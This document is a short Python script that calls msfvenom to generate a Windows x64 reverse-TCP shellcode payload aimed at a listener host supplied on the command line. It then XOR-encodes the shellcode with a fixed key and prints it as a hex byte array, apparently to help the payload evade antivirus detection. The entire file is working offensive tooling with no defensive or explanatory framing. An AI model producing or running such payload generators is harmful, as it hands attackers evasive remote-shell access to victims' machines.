import os
import sys

def xor_encrypt_decrypt(data, key):
    return bytes([b ^ key for b in data])

sys.argv[1]
os.system(f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={sys.argv[1]} LPORT=9001 EXITFUNC=none -f raw -o shellcode.bin")

shellcode = open("shellcode.bin", "rb").read() 

key = 0xAA
encrypted_shellcode = xor_encrypt_decrypt(shellcode,key)
print(''.join('0x{:02x}, '.format(x) for x in encrypted_shellcode)[:-2])
